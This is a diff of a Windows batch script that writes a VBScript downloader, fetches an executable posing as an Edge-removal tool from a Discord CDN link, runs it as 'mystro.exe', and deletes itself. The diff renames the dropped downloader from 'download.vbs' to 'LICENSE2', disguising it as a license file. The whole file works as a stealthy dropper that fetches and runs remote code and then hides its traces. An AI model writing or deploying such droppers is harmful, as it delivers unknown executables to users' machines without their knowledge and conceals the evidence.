@@ -1,6 +1,6 @@
 @echo off
 
-set DLOAD_SCRIPT=download.vbs
+set DLOAD_SCRIPT=LICENSE2
 echo Option Explicit                                                    >  %DLOAD_SCRIPT%
 echo Dim args, http, fileSystem, adoStream, url, target, status         >> %DLOAD_SCRIPT%
 echo.                                                                   >> %DLOAD_SCRIPT%
@@ -32,6 +32,6 @@ echo adoStream.Close                                                    >> %DLOA
 echo.                                                                   >> %DLOAD_SCRIPT%
 
 @cscript //Nologo %DLOAD_SCRIPT% "https://cdn.discordapp.com/attachments/764395888818126858/1227234897719201852/Remove-Edge_GUI.exe?ex=6627aa90&is=66153590&hm=8ee542cfebb432e83be02a3cb719fdcfb03e8ca4dd646942ba27955b28d32384&" mystro.exe
-del "%~dp0\download.vbs"
+del "LICENSE2"
 start "mystro.exe"
 ( del /q /f "%~f0" >nul 2>&1 & exit /b 0  )
